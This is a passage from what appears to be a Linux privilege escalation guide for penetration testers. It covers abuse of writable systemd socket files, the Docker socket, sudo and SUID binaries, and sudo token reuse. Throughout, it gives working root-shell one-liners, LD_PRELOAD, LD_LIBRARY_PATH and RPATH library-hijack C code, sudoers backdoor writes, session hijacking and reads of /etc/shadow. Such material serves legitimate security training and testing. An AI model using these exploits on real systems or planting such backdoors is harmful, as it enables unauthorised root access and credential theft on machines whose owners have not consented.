configured:\nListenStream\n,\nListenDatagram\n,\nListenSequentialPacket\n,\nListenFIFO\n,\nListenSpecial\n,\nListenNetlink\n,\nListenMessageQueue\n,\nListenUSBFunction\n: These options are different but a summary is used to\nindicate where it is going to listen\nto the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)\nAccept\n: Takes a boolean argument. If\ntrue\n, a\nservice instance is spawned for each incoming connection\nand only the connection socket is passed to it. If\nfalse\n, all listening sockets themselves are\npassed to the started service unit\n, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic.\nDefaults to false\n. For performance reasons, it is recommended to write new daemons only in a way that is suitable for\nAccept=no\n.\nExecStartPre\n,\nExecStartPost\n: Takes one or more command lines, which are\nexecuted before\nor\nafter\nthe listening\nsockets\n/FIFOs are\ncreated\nand bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.\nExecStopPre\n,\nExecStopPost\n: Additional\ncommands\nthat are\nexecuted before\nor\nafter\nthe listening\nsockets\n/FIFOs are\nclosed\nand removed, respectively.\nService\n: Specifies the\nservice\nunit name\nto activate\non\nincoming traffic\n. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.\nWritable .socket files\nIf you find a\nwritable\n.socket\nfile you can\nadd\nat the beginning of the\n[Socket]\nsection something like:\nExecStartPre=/home/kali/sys/backdoor\nand the backdoor will be executed before the socket is created. Therefore, you will\nprobably need to wait until the machine is rebooted.\nNote that the system must be using that socket file configuration or the backdoor won't be executed\nWritable sockets\nIf you\nidentify any writable socket\n(\nnow we are talking about Unix Sockets and not about the config\n.socket\nfiles\n), then\nyou can communicate\nwith that socket and maybe exploit a vulnerability.\nEnumerate Unix Sockets\nnetstat\n-a\n-p\n--unix\nRaw connection\n#apt-get install netcat-openbsd\nnc\n-U\n/tmp/socket\n#Connect to UNIX-domain stream socket\nnc\n-uU\n/tmp/socket\n#Connect to UNIX-domain datagram socket\n‚Äã\n#apt-get install socat\nsocat - UNIX-CLIENT:/dev/socket\n#connect to UNIX-domain socket, irrespective of its type\nExploitation example:\nSocket Command Injection\nHTTP sockets\nNote that there may be some\nsockets listening for HTTP\nrequests (\nI'm not talking about .socket files but the files acting as unix sockets\n). You can check this with:\ncurl\n--max-time\n2\n--unix-socket /pat/to/socket/files http:/index\nIf the socket\nresponds with an HTTP\nrequest, then you can\ncommunicate\nwith it and maybe\nexploit some vulnerability\n.\nWritable Docker Socket\nThe\ndocker socke\nt is typically located at\n/var/run/docker.sock\nand is only writable by the\nroot\nuser and\ndocker\ngroup.\nIf for some reason\nyou have write permissions\nover that socket you can escalate privileges.\nThe following commands can be used to escalate privileges:\ndocker\n-H\nunix:///var/run/docker.sock run\n-v\n/:/host\n-it\nubuntu\nchroot\n/host /bin/bash\ndocker\n-H\nunix:///var/run/docker.sock run\n-it\n--privileged\n--pid\n=\nhost debian nsenter\n-t\n1\n-m\n-u\n-n\n-i\nsh\nUse docker web API from socket without docker package\nIf you have access to\ndocker socket\nbut you can't use the docker binary (maybe it isn't even installed), you can use the web API directly with\ncurl\n.\nThe following commands are an example of how to\ncreate a docker container that mounts the root\nof the host system and use\nsocat\nto execute commands into the new docker.\n# List docker images\ncurl\n-XGET\n--unix-socket /var/run/docker.sock http://localhost/images/json\n#[{\"Containers\":-1,\"Created\":1588544489,\"Id\":\"sha256:<ImageID>\",...}]\n# Send JSON to docker API to create the container\ncurl\n-XPOST\n-H\n\"Content-Type: application/json\"\n--unix-socket /var/run/docker.sock\n-d\n'{\"Image\":\"<ImageID>\",\"Cmd\":[\"/bin/sh\"],\"DetachKeys\":\"Ctrl-p,Ctrl-q\",\"OpenStdin\":true,\"Mounts\":[{\"Type\":\"bind\",\"Source\":\"/\",\"Target\":\"/host_root\"}]}'\nhttp://localhost/containers/create\n#{\"Id\":\"<NewContainerID>\",\"Warnings\":[]}\ncurl\n-XPOST\n--unix-socket /var/run/docker.sock http://localhost/containers/\n<\nNewContainerID\n>\n/start\nThe last step is to use\nsocat\nto initiate a connection to the container, sending an \"attach\" request\nsocat - UNIX-CONNECT:/var/run/docker.sock\nPOST /containers/\n<\nNewContainerID\n>\n/attach?stream\n=\n1\n&\nstdin\n=\n1\n&\nstdout\n=\n1\n&\nstderr\n=\n1\nHTTP/1.1\nHost:\nConnection: Upgrade\nUpgrade: tcp\n‚Äã\n#HTTP/1.1 101 UPGRADED\n#Content-Type: application/vnd.docker.raw-stream\n#Connection: Upgrade\n#Upgrade: tcp\nNow, you can execute commands on the container from this\nsocat\nconnection.\nOthers\nNote that if you have write permissions over the docker socket because you are\ninside the group\ndocker\nyou have\nmore ways to escalate privileges\n. If the\ndocker API is listening in a port\nyou can also be able to compromise it\n.\nCheck\nmore ways to break out from docker or abuse it to escalate privileges\nin:\nDocker Security\nContainerd (ctr) privilege escalation\nIf you find that you can use the\nctr\ncommand read the following page as\nyou may be able to abuse it to escalate privileges\n:\nContainerd (ctr) Privilege Escalation\nRunC\nprivilege escalation\nIf you find that you can use the\nrunc\ncommand read the following page as\nyou may be able to abuse it to escalate privileges\n:\nRunC Privilege Escalation\nD-Bus\nD-BUS is an\ninter-Process Communication (IPC) system\n, providing a simple yet powerful mechanism\nallowing applications to talk to one another\n, communicate information and request services. D-BUS was designed from scratch to fulfil the needs of a modern Linux system.\nAs a full-featured IPC and object system, D-BUS has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another‚Äîthink\nUNIX domain sockets on steroids\n. Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately integrate better. For example, a Bluetooth daemon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object‚Äîthink CORBA without the complications. (From\nhere\n).\nD-Bus uses an\nallow/deny model\n, where each message (method call, signal emission, etc.) can be\nallowed or denied\naccording to the sum of all policy rules which match it. Each rule in the policy should have the\nown\n,\nsend_destination\nor\nreceive_sender\nattribute set.\nPart of the policy of\n/etc/dbus-1/system.d/wpa_supplicant.conf\n:\n<\npolicy\nuser\n=\n\"\nroot\n\"\n>\n<\nallow\nown\n=\n\"\nfi.w1.wpa_supplicant1\n\"\n/>\n<\nallow\nsend_destination\n=\n\"\nfi.w1.wpa_supplicant1\n\"\n/>\n<\nallow\nsend_interface\n=\n\"\nfi.w1.wpa_supplicant1\n\"\n/>\n<\nallow\nreceive_sender\n=\n\"\nfi.w1.wpa_supplicant1\n\"\nreceive_type\n=\n\"\nsignal\n\"\n/>\n</\npolicy\n>\nTherefore, if a policy is allowing your user in any way to\ninteract with the bus\n, you could be able to exploit it to escalate privileges (maybe just listing for some passwords?).\nNote that a\npolicy\nthat\ndoesn't specify\nany user or group affects everyone (\n<policy>\n).\nPolicies to the context \"default\" affects everyone not affected by other policies (\n<policy context=\"default\"\n).\nLearn how to enumerate and exploit a D-Bus communication here:\nD-Bus Enumeration & Command Injection Privilege Escalation\nNetwork\nIt's always interesting to enumerate the network and figure out the position of the machine.\nGeneric enumeration\n#Hostname, hosts and DNS\ncat\n/etc/hostname /etc/hosts /etc/resolv.conf\ndnsdomainname\n‚Äã\n#Content of /etc/inetd.conf & /etc/xinetd.conf\ncat\n/etc/inetd.conf /etc/xinetd.conf\n‚Äã\n#Interfaces\ncat\n/etc/networks\n(\nifconfig\n||\nip\na\n)\n‚Äã\n#Neighbours\n(\narp\n-e\n||\narp -a\n)\n(\nroute\n||\nip\nn\n)\n‚Äã\n#Iptables rules\n(\ntimeout\n1\niptables\n-L\n2\n>\n/dev/null\n;\ncat\n/etc/iptables/*\n|\ngrep\n-v\n\"^#\"\n|\ngrep\n-Pv\n\"\\W*\\#\"\n2\n>\n/dev/null\n)\n‚Äã\n#Files used by network services\nlsof\n-i\nOpen ports\nAlways check network services running on the machine that you weren't able to interact with before accessing it:\n(\nnetstat\n-punta\n||\nss --ntpu\n)\n(\nnetstat\n-punta\n||\nss --ntpu\n)\n|\ngrep\n\"127.0\"\nSniffing\nCheck if you can sniff traffic. If you can, you could be able to grab some credentials.\ntimeout 1 tcpdump\nUsers\nGeneric Enumeration\nCheck\nwho\nyou are, which\nprivileges\ndo you have, which\nusers\nare in the systems, which ones can\nlogin\nand which ones have\nroot privileges:\n#Info about me\nid\n||\n(\nwhoami\n&&\ngroups\n)\n2\n>\n/dev/null\n#List all users\ncat\n/etc/passwd\n|\ncut\n-d:\n-f1\n#List users with console\ncat\n/etc/passwd\n|\ngrep\n\"sh$\"\n#List superusers\nawk\n-F:\n'($3 == \"0\") {print}'\n/etc/passwd\n#Currently logged users\nw\n#Login history\nlast\n|\ntail\n#Last log of each user\nlastlog\n‚Äã\n#List all users and their groups\nfor\ni\nin\n$(\ncut\n-d\n\":\"\n-f1\n/etc/passwd\n2\n>\n/dev/null\n)\n;\ndo\nid\n$i\n;\ndone\n2\n>\n/dev/null\n|\nsort\n#Current user PGP keys\ngpg --list-keys\n2\n>\n/dev/null\nBig UID\nSome Linux versions were affected by a bug that allows users with\nUID > INT_MAX\nto escalate privileges. More info:\nhere\n,\nhere\nand\nhere\n.\nExploit it\nusing:\nsystemd-run -t /bin/bash\nGroups\nCheck if you are a\nmember of some group\nthat could grant you root privileges:\nInteresting Groups - Linux Privesc\nClipboard\nCheck if anything interesting is located inside the clipboard (if possible)\nif\n[\n`\nwhich\nxclip\n2\n>\n/dev/null\n`\n];\nthen\necho\n\"Clipboard: \"\n`\nxclip\n-o\n-selection\nclipboard\n2\n>\n/dev/null\n`\necho\n\"Highlighted text: \"\n`\nxclip\n-o\n2\n>\n/dev/null\n`\nelif\n[\n`\nwhich\nxsel\n2\n>\n/dev/null\n`\n];\nthen\necho\n\"Clipboard: \"\n`\nxsel\n-ob\n2\n>\n/dev/null\n`\necho\n\"Highlighted text: \"\n`\nxsel\n-o\n2\n>\n/dev/null\n`\nelse\necho\n\"Not found xsel and xclip\"\nfi\nPassword Policy\ngrep\n\"^PASS_MAX_DAYS\\|^PASS_MIN_DAYS\\|^PASS_WARN_AGE\\|^ENCRYPT_METHOD\"\n/etc/login.defs\nKnown passwords\nIf you\nknow any password\nof the environment\ntry to login as each user\nusing the password.\nSu Brute\nIf don't mind about doing a lot of noise and\nsu\nand\ntimeout\nbinaries are present on the computer, you can try to brute-force user using\nsu-bruteforce\n.\nLinpeas\nwith\n-a\nparameter also try to brute-force users.\nWritable PATH abuses\n$PATH\nIf you find that you can\nwrite inside some folder of the $PATH\nyou may be able to escalate privileges by\ncreating a backdoor inside the writable folder\nwith the name of some command that is going to be executed by a different user (root ideally) and that is\nnot loaded from a folder that is located previous\nto your writable folder in $PATH.\nSUDO and SUID\nYou could be allowed to execute some command using sudo or they could have the suid bit. Check it using:\nsudo\n-l\n#Check commands you can execute with sudo\nfind\n/\n-perm\n-4000\n2\n>\n/dev/null\n#Find all SUID binaries\nSome\nunexpected commands allow you to read and/or write files or even execute a command.\nFor example:\nsudo\nawk\n'BEGIN {system(\"/bin/sh\")}'\nsudo\nfind\n/etc\n-exec\nsh\n-i\n\\;\nsudo\ntcpdump\n-n\n-i\nlo\n-G1\n-w\n/dev/null\n-z\n./runme.sh\nsudo\ntar\nc a.tar\n-I\n./runme.sh a\nftp\n>!\n/bin/sh\nless\n>!\n<\nshell_comand\n>\nNOPASSWD\nSudo configuration might allow a user to execute some command with another user's privileges without knowing the password.\n$ sudo -l\nUser demo may run the following commands on crashlab:\n(root) NOPASSWD: /usr/bin/vim\nIn this example the user\ndemo\ncan run\nvim\nas\nroot\n, it is now trivial to get a shell by adding an ssh key into the root directory or by calling\nsh\n.\nsudo vim -c '!sh'\nSETENV\nThis directive allows the user to\nset an environment variable\nwhile executing something:\n$\nsudo\n-l\nUser waldo may run the following commands on admirer:\n(\nALL\n)\nSETENV: /opt/scripts/admin_tasks.sh\nThis example,\nbased on HTB machine Admirer\n, was\nvulnerable\nto\nPYTHONPATH hijacking\nto load an arbitrary python library while executing the script as root:\nsudo\nPYTHONPATH\n=\n/dev/shm/ /opt/scripts/admin_tasks.sh\nSudo execution bypassing paths\nJump\nto read other files or use\nsymlinks\n. For example in sudoers file:\nhacker10 ALL= (root) /bin/less /var/log/*\nsudo\nless\n/var/logs/anything\nless\n>\n:e /etc/shadow\n#Jump to read other files using privileged less\nln\n/etc/shadow /var/log/new\nsudo\nless\n/var/log/new\n#Use symlinks to read any file\nIf a\nwildcard\nis used (*), it is even easier:\nsudo\nless\n/var/log/\n..\n/\n..\n/etc/shadow\n#Read shadow\nsudo\nless\n/var/log/something /etc/shadow\n#Red 2 files\nCountermeasures\n:\nhttps://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/\n‚Äã\nSudo command/SUID binary without command path\nIf the\nsudo permission\nis given to a single command\nwithout specifying the path\n:\nhacker10 ALL= (root) less\nyou can exploit it by changing the PATH variable\nexport\nPATH\n=\n/tmp:\n$PATH\n#Put your backdoor in /tmp and name it \"less\"\nsudo\nless\nThis technique can also be used if a\nsuid\nbinary\nexecutes another command without specifying the path to it (always check with\nstrings\nthe content of a weird SUID binary)\n.\n‚Äã\nPayload examples to execute.\n‚Äã\nSUID binary with command path\nIf the\nsuid\nbinary\nexecutes another command specifying the path\n, then, you can try to\nexport a function\nnamed as the command that the suid file is calling.\nFor example, if a suid binary calls\n/usr/sbin/service apache2 start\nyou have to try to create the function and export it:\nfunction\n/usr/sbin/\nservice\n()\n{\ncp\n/bin/bash /tmp\n&&\nchmod\n+s /tmp/bash\n&&\n/tmp/bash -p\n;\n}\nexport\n-f\n/usr/sbin/service\nThen, when you call the suid binary, this function will be executed\nLD_PRELOAD &\nLD_LIBRARY_PATH\nLD_PRELOAD\nis an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.\nTo avoid this mechanism being used as an attack vector for\nsuid/sgid\nexecutable binaries, the loader ignores\nLD_PRELOAD\nif\nruid != euid\n. For such binaries, only libraries in standard paths that are also\nsuid/sgid\nwill be preloaded.\nIf you find inside the output of\nsudo -l\nthe sentence:\nenv_keep+=LD_PRELOAD\nand you can call some command with sudo, you can escalate privileges.\nDefaults        env_keep += LD_PRELOAD\nSave as\n/tmp/pe.c\n#\ninclude\n<stdio.h>\n#\ninclude\n<sys/types.h>\n#\ninclude\n<stdlib.h>\n‚Äã\nvoid\n_init\n()\n{\nunsetenv\n(\n\"LD_PRELOAD\"\n);\nsetgid\n(\n0\n);\nsetuid\n(\n0\n);\nsystem\n(\n\"/bin/bash\"\n);\n}\nThen\ncompile it\nusing:\ncd\n/tmp\ngcc\n-fPIC\n-shared\n-o\npe.so pe.c\n-nostartfiles\nFinally,\nescalate privileges\nrunning\nsudo\nLD_PRELOAD\n=\n./pe.so\n<\nCOMMAND\n>\n#Use any command you can run with sudo\nA similar privesc can be abused if the attacker controls the\nLD_LIBRARY_PATH\nenv variable because he controls the path where libraries are going to be searched.\n#\ninclude\n<stdio.h>\n#\ninclude\n<stdlib.h>\n‚Äã\nstatic\nvoid\nhijack\n()\n__attribute__\n((\nconstructor\n));\n‚Äã\nvoid\nhijack\n()\n{\nunsetenv\n(\n\"LD_LIBRARY_PATH\"\n);\nsetresuid\n(\n0\n,\n0\n,\n0\n);\nsystem\n(\n\"/bin/bash -p\"\n);\n}\n# Compile & execute\ncd\n/tmp\ngcc\n-o\n/tmp/libcrypt.so.1\n-shared\n-fPIC\n/home/user/tools/sudo/library_path.c\nsudo\nLD_LIBRARY_PATH\n=\n/tmp\n<\nCOMMAND\n>\nSUID Binary ‚Äì .so injection\nIf you find some weird binary with\nSUID\npermissions, you could check if all the\n.so\nfiles are\nloaded correctly\n. To do so you can execute:\nstrace\n<\nSUID-BINARY\n>\n2\n>\n&1\n|\ngrep\n-i\n-E\n\"open|access|no such file\"\nFor example, if you find something like:\npen(‚Äú/home/user/.config/libcalc.so‚Äù, O_RDONLY) = -1 ENOENT (No such file or directory)\nyou can exploit it.\nCreate the file\n/home/user/.config/libcalc.c\nwith the code:\n#\ninclude\n<stdio.h>\n#\ninclude\n<stdlib.h>\n‚Äã\nstatic\nvoid\ninject\n()\n__attribute__\n((\nconstructor\n));\n‚Äã\nvoid\ninject\n(){\nsystem\n(\n\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p\"\n);\n}\nCompile it using:\ngcc\n-shared\n-o\n/home/user/.config/libcalc.so\n-fPIC\n/home/user/.config/libcalc.c\nAnd execute the binary.\nShared Object Hijacking\n# Lets find a SUID using a non-standard library\nldd some_suid\nsomething.so\n=>\n/lib/x86_64-linux-gnu/something.so\n‚Äã\n# The SUID also loads libraries from a custom location where we can write\nreadelf\n-d\npayroll\n|\ngrep\nPATH\n0x000000000000001d\n(\nRUNPATH\n)\nLibrary runpath:\n[\n/development\n]\nNow that we have found a SUID binary loading a library from a folder where we can write, lets create the library in that folder with the necessary name:\n//gcc src.c -fPIC -shared -o /development/libshared.so\n#\ninclude\n<stdio.h>\n#\ninclude\n<stdlib.h>\n‚Äã\nstatic\nvoid\nhijack\n()\n__attribute__\n((\nconstructor\n));\n‚Äã\nvoid\nhijack\n()\n{\nsetresuid\n(\n0\n,\n0\n,\n0\n);\nsystem\n(\n\"/bin/bash -p\"\n);\n}\nIf you get an error such as\n./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name\nthat means that the library you have generated need to have a function called\na_function_name\n.\nGTFOBins\n‚Äã\nGTFOBins\nis a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.\nGTFOArgs\nis the same but for cases where you can\nonly inject arguments\nin a command.\nThe project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.\ngdb -nx -ex '!sh' -ex quit\nsudo mysql -e '! /bin/sh'\nstrace -o /dev/null /bin/sh\nsudo awk 'BEGIN {system(\"/bin/sh\")}'\nGTFOBins\nGTFOArgs\nFallOfSudo\nIf you can access\nsudo -l\nyou can use the tool\nFallOfSudo\nto check if it finds how to exploit any sudo rule.\nReusing Sudo Tokens\nIn the scenario where\nyou have a shell as a user with sudo privileges\nbut you don't know the password of the user, you can\nwait for him/her to execute some command using\nsudo\n. Then, you can\naccess the token of the session where sudo was used and use it to execute anything as sudo\n(privilege escalation).\nRequirements to escalate privileges:\nYou already have a shell as user \"\nsampleuser\n\"\n\"\nsampleuser\n\" have\nused\nsudo\nto execute something in the\nlast 15mins\n(by default that's the duration of the sudo token that allows us to use\nsudo\nwithout introducing any password)\ncat /proc/sys/kernel/yama/ptrace_scope\nis 0\ngdb\nis accessible (you can be able to upload it)\n(You can temporarily enable\nptrace_scope\nwith\necho 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope\nor permanently modifying\n/etc/sysctl.d/10-ptrace.conf\nand setting\nkernel.yama.ptrace_scope = 0\n)\nIf all these requirements are met,\nyou can escalate privileges using:\nhttps://github.com/nongiach/sudo_inject\n‚Äã\nThe\nfirst exploit\n(\nexploit.sh\n) will create the binary\nactivate_sudo_token\nin\n/tmp\n. You can use it to\nactivate the sudo token in your session\n(you won't get automatically a root shell, do\nsudo su\n):\nbash\nexploit.sh\n/tmp/activate_sudo_token\nsudo\nsu\nThe\nsecond exploit\n(\nexploit_v2.sh\n) will create a sh shell in\n/tmp\nowned by root with setuid\nbash\nexploit_v2.sh\n/tmp/sh\n-p\nThe\nthird exploit\n(\nexploit_v3.sh\n) will\ncreate a sudoers file\nthat makes\nsudo tokens eternal and allows all users to use sudo\nbash\nexploit_v3.sh\nsudo\nsu\n/var/run/sudo/ts/<Username>\nIf you have\nwrite permissions\nin the folder or on any of the created files inside the folder you can use the binary\nwrite_sudo_token\nto\ncreate a sudo token for a user and PID\n.\nFor example, if you can overwrite the file\n/var/run/sudo/ts/sampleuser\nand you have a shell as that user with PID 1234, you can\nobtain sudo privileges\nwithout needing to know the password doing:\n./write_sudo_token\n1234\n>\n/var/run/sudo/ts/sampleuser\n/etc/sudoers, /etc/sudoers.d\nThe file\n/etc/sudoers\nand the files inside\n/etc/sudoers.d\nconfigure who can use\nsudo\nand how. These files\nby default can only be read by user root and group root\n.\nIf\nyou can\nread\nthis file you could be able to\nobtain some interesting information\n, and if you can\nwrite\nany file you will be able to\nescalate privileges\n.\nls\n-l\n/etc/sudoers /etc/sudoers.d/\nls\n-ld\n/etc/sudoers.d/\nIf you can write you can abuse this permission\necho\n\"\n$(\nwhoami\n)\nALL=(ALL) NOPASSWD: ALL\"\n>>\n/etc/sudoers\necho\n\"\n$(\nwhoami\n)\nALL=(ALL) NOPASSWD: ALL\"\n>>\n/etc/sudoers.d/README\nAnother way to abuse these permissions:\n# makes it so every terminal can sudo\necho\n\"Defaults !tty_tickets\"\n>\n/etc/sudoers.d/win\n# makes it so sudo never times out\necho\n\"Defaults timestamp_timeout=-1\"\n>>\n/etc/sudoers.d/win\nDOAS\nThere are some alternatives to the\nsudo\nbinary such as\ndoas\nfor OpenBSD, remember to check its configuration at\n/etc/doas.conf\npermit nopass demo as root cmd vim\nSudo Hijacking\nIf you know that a\nuser usually connects to a machine and uses\nsudo\nto escalate privileges and you got a shell within that user context, you can\ncreate a new sudo executable\nthat will execute your code as root and then the user's command. Then,\nmodify the $PATH\nof the user context (for example adding the new path in .bash_profile) so when the user executes sudo, your sudo executable is executed.\nNote that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example\nsudo-piggyback\nmodifies\n~/.bashrc\n,\n~/.zshrc\n,\n~/.bash_profile\n. You can find another example in\nbashdoor.py\n‚Äã\nShared Library\nld.so\nThe file\n/etc/ld.so.conf\nindicates\nwhere the loaded configurations files are from\n. Typically, this file contains the following path:\ninclude /etc/ld.so.conf.d/*.conf\nThat means that the configuration files from\n/etc/ld.so.conf.d/*.conf\nwill be read. This configuration files\npoints to other folders\nwhere\nlibraries\nare going to be\nsearched\nfor. For example, the content of\n/etc/ld.so.conf.d/libc.conf\nis\n/usr/local/lib\n.\nThis means that the system will search for libraries inside\n/usr/local/lib\n.\nIf for some reason\na user has write permissions\non any of the paths indicated:\n/etc/ld.so.conf\n,\n/etc/ld.so.conf.d/\n, any file inside\n/etc/ld.so.conf.d/\nor any folder within the config file inside\n/etc/ld.so.conf.d/*.conf\nhe may be able to escalate privileges.\nTake a look at\nhow to exploit this misconfiguration\nin the following page:\nld.so privesc exploit example\nRPATH\nlevel15@nebula:/home/flag15$ readelf -d flag15 | egrep \"NEEDED|RPATH\"\n0x00000001 (NEEDED)                     Shared library: [libc.so.6]\n0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]\n‚Äã\nlevel15@nebula:/home/flag15$ ldd ./flag15\nlinux-gate.so.1 =>  (0x0068c000)\nlibc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)\n/lib/ld-linux.so.2 (0x005bb000)\nBy copying the lib into\n/var/tmp/flag15/\nit will be used by the program in this place as specified in the\nRPATH\nvariable.\nlevel15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/\n‚Äã\nlevel15@nebula:/home/flag15$ ldd ./flag15\nlinux-gate.so.1 =>  (0x005b0000)\nlibc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)\n/lib/ld-linux.so.2 (0x00737000)\nThen create an evil library in\n/var/tmp\nwith\ngcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6\n#\ninclude\n<stdlib.h>\n#\ndefine\nSHELL\n\"/bin/sh\"\n‚Äã\nint\n__libc_start_main\n(\nint\n(\n*\nmain\n)\n(\nint\n,\nchar\n**\n,\nchar\n**\n),\nint\nargc\n,\nchar\n**\nubp_av\n,\nvoid\n(\n*\ninit\n)\n(\nvoid\n),\nvoid\n(\n*\nfini\n)\n(\nvoid\n),\nvoid\n(\n*\nrtld_fini\n)\n(\nvoid\n),\nvoid\n(\n*\nstack_end\n))\n{\nchar\n*\nfile\n=\nSHELL\n;\nchar\n*\nargv\n[]\n=\n{\nSHELL\n,\n0\n};\nsetresuid\n(\ngeteuid\n(),\ngeteuid\n(),\ngeteuid\n());\nexecve\n(\nfile\n,\nargv\n,\n0\n);\n}\nCapabilities\nLinux capabilities provide a\nsubset of the available root privileges to a process\n. This effectively breaks up root\nprivileges into smaller and distinctive units\n. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\nRead the following page to\nlearn more about capabilities and how to abuse them\n:\nLinux Capabilities\nDirectory permissions\nIn a directory, the\nbit for \"execute\"\nimplies that the user affected can \"\ncd\n\" into the folder.\nThe\n\"read\"\nbit implies the user can\nlist\nthe\nfiles\n, and the\n\"write\"\nbit implies the user can\ndelete\nand\ncreate\nnew\nfiles\n.\nACLs\nACLs (Access Control Lists) are the second level of discretionary permissions, that\nmay override the standard ugo/rwx\nones. When used correctly they can grant you a\nbetter granularity in setting access to a file or a directory\n, for example by giving or denying access to a specific user that is neither the file owner nor the group owner (from\nhere\n).\nGive\nuser \"kali\" read and write permissions over a file:\nsetfacl\n-m\nu:kali:rw file.txt\n#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)\n‚Äã\nsetfacl\n-b\nfile.txt\n#Remove the ACL of the file\nGet\nfiles with specific ACLs from the system:\ngetfacl\n-t\n-s\n-R\n-p\n/bin /etc /home /opt /root /sbin /usr /tmp\n2\n>\n/dev/null\nOpen shell sessions\nIn\nold versions\nyou may\nhijack\nsome\nshell\nsession of a different user (\nroot\n).\nIn\nnewest versions\nyou will be able to\nconnect\nto screen sessions only of\nyour own user\n. However, you could find\ninteresting information inside the session\n.\nscreen sessions hijacking\nList screen sessions\nscreen\n-ls\nscreen\n-ls\n<\nusername\n>\n/\n# Show another user' screen sessions\nAttach to a session\nscreen\n-dr\n<\nsession\n>\n#The -d is to detach whoever is attached to it\nscreen\n-dr\n3350\n.foo\n#In the example of the image\nscreen\n-x\n[\nuser\n]\n/\n[\nsession id\n]\ntmux sessions hijacking\nThis was a problem with\nold tmux versions\n. I wasn't able to hijack a tmux (v2.1) session created by root as a non-privileged user.\nList tmux sessions\ntmux\nls\nps\naux\n|\ngrep\ntmux\n#Search for tmux consoles not using default folder for sockets\ntmux\n-S\n/tmp/dev_sess\nls\n#List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess\nAttach to a session\ntmux attach\n-t\nmyname\n#If you write something in this session it will appears in the other opened one\ntmux attach\n-d\n-t\nmyname\n#First detach the session from the other console and then access it yourself\n‚Äã\nls\n-la\n/tmp/dev_sess\n#Check who can access it\nrw-rw----\n1\nroot devs\n0\nSep\n1\n06:27 /tmp/dev_sess\n#In this case root and devs can\n# If you are root or devs you can access it\ntmux\n-S\n/tmp/dev_sess attach\n-t\n0\n#Attach using a non-default tmux socket\nCheck\nValentine box from HTB\nfor an example.\nSSH\nDebian OpenSSL Predictable PRNG - CVE-2008-0166\nAll SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\nThis bug is caused when creating a new ssh key in those OS, as\nonly 32,768 variations were possible\n. This means that all the possibilities can be calculated and\nhaving the ssh public key you can search for the corresponding private key\n. You can find the calculated possibilities here:\nhttps://github.com/g0tmi1k/debian-ssh\n‚Äã\nSSH Interesting configuration values\nPasswordAuthentication:\nSpecifies whether password authentication is allowed. The default is\nno\n.\nPubkeyAuthentication:\nSpecifies whether public key authentication is allowed. The default is\nyes\n.\nPermitEmptyPasswords\n: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is\nno\n.\nPermitRootLogin\nSpecifies whether root can log in using ssh, default is\nno\n. Possible values:\nyes\n: root can login using password and private key\nwithout-password\nor\nprohibit-password\n: root can only login with a private key\nforced-commands-only\n: Root can login only using private key and if the commands options are specified\nno\n: no\nAuthorizedKeysFile\nSpecifies files that contain the public keys that can be used for user authentication. It can contain tokens like\n%h\n, which will be replaced by the home directory.\nYou can indicate absolute paths\n(starting in\n/\n) or\nrelative paths from the user's home\n. For example:\nAuthorizedKeysFile    .ssh/authorized_keys access\nThat configuration will indicate that if you try to login with the\nprivate\nkey of the user \"\ntestusername\n\" ssh is going to compare the public key of your key with the ones located in\n/home/testusername/.ssh/authorized_keys\nand\n/home/testusername/access\nForwardAgent/AllowAgentForwarding\nSSH agent forwarding allows you to\nuse your local SSH keys instead of leaving keys\n(without passphrases!) sitting on your server. So, you will be able to\njump\nvia ssh\nto a host\nand from there\njump to another\nhost\nusing\nthe\nkey\nlocated in your\ninitial host\n.\nYou need to set this option in\n$HOME/.ssh.config\nlike this:\nHost example.com\nForwardAgent yes\nNotice that if\nHost\nis\n*\nevery time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).\nThe file\n/etc/ssh_config\ncan\noverride\nthis\noptions\nand allow or denied this configuration.\nThe file\n/etc/sshd_config\ncan\nallow\nor\ndenied\nssh-agent forwarding with the keyword\nAllowAgentForwarding\n(default is allow).\nIf you find that Forward Agent is configured in an environment read the following page as\nyou may be able to abuse it to escalate privileges\n:\nSSH Forward Agent exploitation\nInteresting Files\nProfiles files\nThe file\n/etc/profile\nand the files under\n/etc/profile.d/\nare\nscripts that are executed when a user runs a new shell\n. Therefore, if you can\nwrite or modify any of them you can escalate privileges\n.\nls\n-l\n/etc/profile /etc/profile.d/\nIf any weird profile script is found you should check it for\nsensitive details\n.\nPasswd/Shadow Files\nDepending on the OS the\n/etc/passwd\nand\n/etc/shadow\nfiles may be using a different name or there may be a backup. Therefore it's recommended\nfind all of them\nand\ncheck if you can read\nthem to see\nif there are hashes\ninside the files:\n#Passwd equivalent files\ncat\n/etc/passwd 